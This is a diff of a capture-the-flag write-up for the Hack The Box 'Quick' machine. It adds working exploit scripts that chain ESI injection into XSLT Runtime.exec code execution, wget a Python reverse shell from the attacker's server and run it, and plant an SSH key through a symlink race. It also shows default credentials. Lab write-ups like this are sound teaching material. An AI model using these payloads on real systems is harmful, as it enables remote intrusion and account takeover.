@@ -64,7 +64,15 @@ Content-Length: 4345
 Esigate looks to be vulnerable(https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/) but we need to be able to reflect tags and
 there's nothing that allows that yet. Perhaps we can do it later on.
 
-There's text that states _We are migrating our portal with latest TLS and HTTP support. To read more about our services, please navigate to our portal_. Let's check for http3 support. First let's check port udp and port 443 given the https://portal.quick.htb link.
+There's text that states _We are migrating our portal with latest TLS and HTTP support. To read more about our services, please navigate to our portal_, and a link to https://portal.quick.htb.
+
+### portal.quick.htb
+
+#### Connecting
+
+We know from our earlier nmap scan that port 443 isn't open. Given that the challenge is named quick, and the little
+snippet talks about the latest TLC and HTTP support, perhaps it's referring to http/3, which uses [QUIC](https://en.wikipedia.org/wiki/QUIC).  It uses
+UDP so lets use nmap to check.
 
 ```shell-session
 ╭─zoey@nomadic ~/htb/travel ‹master*›
@@ -89,13 +97,46 @@ Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds
            Raw packets sent: 6 (342B) | Rcvd: 1 (40B)
 ```
 
-### portal.quick.htb
+Success.  Now we need a way to access it. Firefox nightly and chrome don't seem to work. Maybe we need something a little lower level.
+Let's try curl. A bit of searching shows we'd need to compile the support into curl, however there's a [docker image](https://hub.docker.com/r/ymuski/curl-http3) available where someone's
+already done it for us. Lets give it a go.
 
-First we need a way to access it, since we know port 443 is open. Firefox nightly and chrome don't seem to be working. Let's try curl. We'll need to compile support into it, perhaps there might be a docker container available as well.
+```shell-session
+╭─zoey@parrot-virtual ~/dev/public-write-ups ‹master› 
+╰─$ docker run -it --rm ymuski/curl-http3 curl -ILv https://10.10.10.186 --http3
+*   Trying 10.10.10.186:443...
+* Sent QUIC client Initial, ALPN: h3-29,h3-28,h3-27
+* Connected to 10.10.10.186 (10.10.10.186) port 443 (#0)
+* h3 [:method: HEAD]
+* h3 [:path: /]
+* h3 [:scheme: https]
+* h3 [:authority: 10.10.10.186]
+* h3 [user-agent: curl/7.73.0-DEV]
+* h3 [accept: */*]
+* Using HTTP/3 Stream ID: 0 (easy handle 0x55725496da20)
+> HEAD / HTTP/3
+> Host: 10.10.10.186
+> user-agent: curl/7.73.0-DEV
+> accept: */*
+> 
+< HTTP/3 200
+HTTP/3 200
+< server: nginx/1.16.1
+server: nginx/1.16.1
+< date: Sun, 31 Jan 2021 04:52:03 GMT
+date: Sun, 31 Jan 2021 04:52:03 GMT
+< content-type: text/html; charset=UTF-8
+content-type: text/html; charset=UTF-8
+< x-powered-by: PHP/7.4.3
+x-powered-by: PHP/7.4.3
+< alt-svc: h3-23=":443"; ma=86400
+alt-svc: h3-23=":443"; ma=86400
+* Connection #0 to host 10.10.10.186 left intact
+```
 
-https://github.com/curl/curl/blob/master/docs/HTTP3.md
+#### Enumeration
 
-Using curl seems to work. The index page has a few links:
+The index page has a few links:
 
 ```html
 <html>
@@ -112,7 +153,7 @@ Using curl seems to work. The index page has a few links:
 </html>
 ```
 
-Navigating the site via curl we eventually find a file, `Connectivity.pdf` under the docs folder.
+Navigating the site via curl, on the `index.php?view=docs` page we eventually find a link to a file, `Connectivity.pdf`.
 
 #### Connectivity.pdf
 
@@ -126,13 +167,12 @@ How to Connect ?
 4. Don’t forget to ping us on chat whenever there is an issue.
 ```
 
-### Back to login.php
-
-We have a default password for the ticketing system, and some potential emails. Let's try variations of the emails for the users which have had no issues(see the testimonials), meaning they probably haven't had to access the support portal. Using the potential emails, we find that `elisa@wink.co.uk:Quick4cc3$$` works as a login for the ticketing system.
-
 ### Ticketing System
 
-http://quick.htb:9001/home.php
+We now have a default password for the login page we found on the main site, and some potential emails. Let's try variations of the emails for the
+users which have had no issues(see the testimonials), meaning they probably haven't had to access the support portal, and the password might not have
+been changed. Using the potential emails, we find that `elisa@wink.co.uk:Quick4cc3$$` works as a login, and we have access to the ticketing system
+at [http://quick.htb:9001/home.php](http://quick.htb:9001/home.php)
 
 #### ticket.php
 
@@ -140,7 +180,7 @@ We can make a ticket with an idea that we can later search. The ticket ID is TKT
 
 #### search.php
 
-Given a ticket ID we can search with the ticket id as part of the url parameter. Seems to allow all kinds of XSS but can't seem to make any request hit my server.
+Given a ticket ID we can search with the ticket id as part of the url parameter. Seems to allow all kinds of tags and XSS but can't seem to make any request hit my server. However, if
 
 #### esigate
 
@@ -153,7 +193,7 @@ Now that we have the ability to reflect tags, we can take advantage of the vulne
 ```
 
 Then we need to make the request to search.php with the appropriate TKT number. This initiates the request to our local server, which serves the `evil.xsl`, which makes the
-call to java's exec, giving us RCE. Once we have RCE, we can try netcat but it doesn't seem the `-e` switch works. So lets upload/download a python script for a reverse shell, and then run it. Don't forget to setup the netcat listener, and be running a local server to serve the `evil.xsl` file and the python reverse shell. This script will automate most of the process
+call to java's exec, giving us RCE. Once we have RCE, we can try netcat but it doesn't seem the `-e` switch works. So lets upload/download a python script for a reverse shell, and then run it. Don't forget to setup the netcat listener, and be running a local server to serve the `evil.xsl` file and the python reverse shell. This script will automate most of the process, but you may need to alter the paths to get it to work.
 
 ```bash
 #!/bin/sh
@@ -173,7 +213,7 @@ curl --silent http://quick.htb:9001/index.php > /dev/null
 sess=$(curl -v 'http://quick.htb:9001/login.php' --data 'email=elisa%40wink.co.uk&password=Quick4cc3%24%24' 2>&1 | grep PHPSESSID | sed 's/.*PHPSESSID=//' | sed 's/; Path=\///')
 echo "Session cookie ${sess}"
 
-# Grab a ticket value so we don't actually hit an existing one
+# Grab a ticket value so we don't hit an existing one
 tkt=$(curl 'http://quick.htb:9001/ticket.php' -H "Cookie: PHPSESSID=${sess}" | grep TKT | sed 's/.*value="TKT-//' | sed 's/"\/>//')
 echo "Got ticket number ${tkt}"
 
@@ -181,19 +221,41 @@ echo "Got ticket number ${tkt}"
 curl --silent 'http://quick.htb:9001/ticket.php' -H "Cookie: PHPSESSID=${sess}" --data "title=title&msg=%3Cesi%3Ainclude+src%3D%22http%3A%2F%2Flocalhost%3A9001%2Findex.php%22+stylesheet%3D%22http%3A%2F%2F${htbip}%2Fquick%2Fevil.xsl%22%3E%0D%0A%3C%2Fesi%3Ainclude%3E&id=TKT-${tkt}"
 echo "Ticket with esigate exploit created"
 
-# Download the python rev shell
+# XXE to download the python rev shell
 cat part1.xsl > evil.xsl
 echo "<xsl:variable name=\"cmd\"><![CDATA[wget http://${htbip}/quick/rev-shell.py]]></xsl:variable>" >> evil.xsl
 cat part2.xsl >> evil.xsl
 curl --silent "http://quick.htb:9001/search.php?search=${tkt}" -H "Cookie: PHPSESSID=${sess}"
 echo "Python reverse shell downloaded"
 
-# Run the python reverse shell
+# XXE to run the python reverse shell
 cat part1.xsl > evil.xsl
 echo "<xsl:variable name=\"cmd\"><![CDATA[python rev-shell.py]]></xsl:variable>" >> evil.xsl
 cat part2.xsl >> evil.xsl
 curl --silent "http://quick.htb:9001/search.php?search=${tkt}" -H "Cookie: PHPSESSID=${sess}"
 echo "Connecting..."
+```
+
+The parts of the `evil.xsl` file referenced in the script are as follows:
+
+```
+part1.xsl
+<?xml version="1.0" ?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:output method="xml" omit-xml-declaration="yes"/>
+<xsl:template match="/"
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
+<root>
+
+part2.xsl
+<xsl:variable name="rtObj" select="rt:getRuntime()"/>
+<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
+Process: <xsl:value-of select="$process"/>
+Command: <xsl:value-of select="$cmd"/>
+</root>
+</xsl:template>
+</xsl:stylesheet>
 ```
 
 If done properly we should now have a reverse shell.
@@ -407,32 +469,20 @@ if($_SESSION["loggedin"])
 
 The script calls `file_put_contents`, writing the `desc` value into it. The `/var/www/jobs` directory is world-writeable so we can create a symlink into whatever
 file we want, and have the server write what we want into it. Let's write a public ssh key into `/home/srvadm/.ssh/authorized_keys`. We'll need to create
-a script to create the symlink and then make the call to the server quickly since the filename is based on the time, and includes the seconds value:
+a script to create the symlink and then make the call to the server quickly since the filename is based on the time, and includes the seconds value.  You'll need to replace public key in the script with your own, don't forget to url encode.
 
 ```bash
 #!/bin/sh
+
+# Run this as Sam on quick.htb to add the ssh public key to srvadm's authorized_keys
+
+sess=$(curl -v 'http://localhost:9001/index.php' -H "Host: printerv2.quick.htb" --data 'email=srvadm%40quick.htb&password=yl51pbx' 2>&1 | grep PHPSESSID | sed 's/.*PHPSESSID=//' | sed 's/;.*//')
 filename=$(php -r "echo date('Y-m-d_H:i:s');")
-ln -s /home/srvadm/.ssh/authorized_keys "${filename}"
-curl 'http://localhost/job.php' -H 'Host: printerv2.quick.htb' -H "Cookie: PHPSESSID=${1}" --data "title=title&desc=${2}&submit=yup" & > /dev/null 2>&1
-```
-
-Then we can call this script with a validated session ID, and a urlencoded SSH public key:
-
-```shell-session
-sam@quick:/var/www/printer$ ~/ex.sh ohbmpgbik89261er6joj7rg8ic ssh%2Drsa%20AAAAB3NzaC1yc2EAAAADAQABAAABgQDIxJfGA7%2F0W9izQKEb87wTkKw3Ko83AIjcDw%2BScukapOKIYZ%2FN16ApuuC3TeFuSBrWtiIY1ZY7b35pnXsYg9zju6bb%2Fv3Qz9EBAdepxE9yjJY6yzylCUjm%2Fm%2B2vUKdnMYYMfwCmaL9EgJfXsvom6x1oZ%2BdIjykB57PyoX53P0hZ%2B1Irz3IY5xqc8einuP0X%2F50vuT42XnqRQSvCLAar2E6LPWfUc0l4GoN7lhM7l8eZ6v9Qn0Rj%2FpDLDIxf4UL4o3FdLSiV4is%2F4G1SHe5i0IUWtRmW%2BUR3h%2Bxi5Ujh7L7Xhxr99WacvIg6SydVRndBh2fC3zZKTobZDwPNR43R9MI8hSFclPo2t4kKgFn5ywd16qUDD2B%2BUtKUt%2Famotpgq8TVRVaTjICbVrJA1TEmEDO%2BNV1zo%2B6Ym5%2BHJEd8E%2Blg%2FkuhP2%2BLNJ7e39SaNDzc7coL%2F0ZCxQieu6tteVcNotUlUBGRhJo2T4vPjIGX4IydWkjcPg6WFFG%2FWUhANYMSnc%3D
+ln -s /home/srvadm/.ssh/authorized_keys "/var/www/jobs/${filename}"
+curl 'http://localhost/job.php' -H 'Host: printerv2.quick.htb' -H "Cookie: PHPSESSID=${sess}" --data 'title=Port+8081&desc=ssh%2Drsa%20AAAAB3NzaC1yc2EAAAADAQABAAABgQDIxJfGA7%2F0W9izQKEb87wTkKw3Ko83AIjcDw%2BScukapOKIYZ%2FN16ApuuC3TeFuSBrWtiIY1ZY7b35pnXsYg9zju6bb%2Fv3Qz9EBAdepxE9yjJY6yzylCUjm%2Fm%2B2vUKdnMYYMfwCmaL9EgJfXsvom6x1oZ%2BdIjykB57PyoX53P0hZ%2B1Irz3IY5xqc8einuP0X%2F50vuT42XnqRQSvCLAar2E6LPWfUc0l4GoN7lhM7l8eZ6v9Qn0Rj%2FpDLDIxf4UL4o3FdLSiV4is%2F4G1SHe5i0IUWtRmW%2BUR3h%2Bxi5Ujh7L7Xhxr99WacvIg6SydVRndBh2fC3zZKTobZDwPNR43R9MI8hSFclPo2t4kKgFn5ywd16qUDD2B%2BUtKUt%2Famotpgq8TVRVaTjICbVrJA1TEmEDO%2BNV1zo%2B6Ym5%2BHJEd8E%2Blg%2FkuhP2%2BLNJ7e39SaNDzc7coL%2F0ZCxQieu6tteVcNotUlUBGRhJo2T4vPjIGX4IydWkjcPg6WFFG%2FWUhANYMSnc%3D&submit=yup' & > /dev/null 2>&1
 ```
 
 If everything went well we should be able to ssh into the `srvadm` user. Let's script our way back in, in case we need to do it again:
-
-```bash
-#!/bin/sh
-
-mysql -h localhost -u db_adm -pdb_p4ss quick -e "Update users set password='0c0ba48811bed85e3093bc71c6037891' where email='srvadm@quick.htb';" 2>/dev/null
-sess=$(curl -v 'http://localhost/index.php' -H "Host: printerv2.quick.htb" --data 'email=srvadm%40quick.htb&password=password' 2>&1 | grep PHPSESSID | sed 's/.*PHPSESSID=//' | sed 's/;.*//')
-filename=$(php -r "echo date('Y-m-d_H:i:s');")
-ln -s /home/srvadm/.ssh/authorized_keys "${filename}"
-curl 'http://localhost/job.php' -H 'Host: printerv2.quick.htb' -H "Cookie: PHPSESSID=${sess}" --data 'title=Port+8081&desc=ssh%2Drsa%20AAAAB3NzaC1yc2EAAAADAQABAAABgQDIxJfGA7%2F0W9izQKEb87wTkKw3Ko83AIjcDw%2BScukapOKIYZ%2FN16ApuuC3TeFuSBrWtiIY1ZY7b35pnXsYg9zju6bb%2Fv3Qz9EBAdepxE9yjJY6yzylCUjm%2Fm%2B2vUKdnMYYMfwCmaL9EgJfXsvom6x1oZ%2BdIjykB57PyoX53P0hZ%2B1Irz3IY5xqc8einuP0X%2F50vuT42XnqRQSvCLAar2E6LPWfUc0l4GoN7lhM7l8eZ6v9Qn0Rj%2FpDLDIxf4UL4o3FdLSiV4is%2F4G1SHe5i0IUWtRmW%2BUR3h%2Bxi5Ujh7L7Xhxr99WacvIg6SydVRndBh2fC3zZKTobZDwPNR43R9MI8hSFclPo2t4kKgFn5ywd16qUDD2B%2BUtKUt%2Famotpgq8TVRVaTjICbVrJA1TEmEDO%2BNV1zo%2B6Ym5%2BHJEd8E%2Blg%2FkuhP2%2BLNJ7e39SaNDzc7coL%2F0ZCxQieu6tteVcNotUlUBGRhJo2T4vPjIGX4IydWkjcPg6WFFG%2FWUhANYMSnc%3D&submit=yup' & > /dev/null 2>&1
-```
 
 ## Enum as srvadm and owning root
 
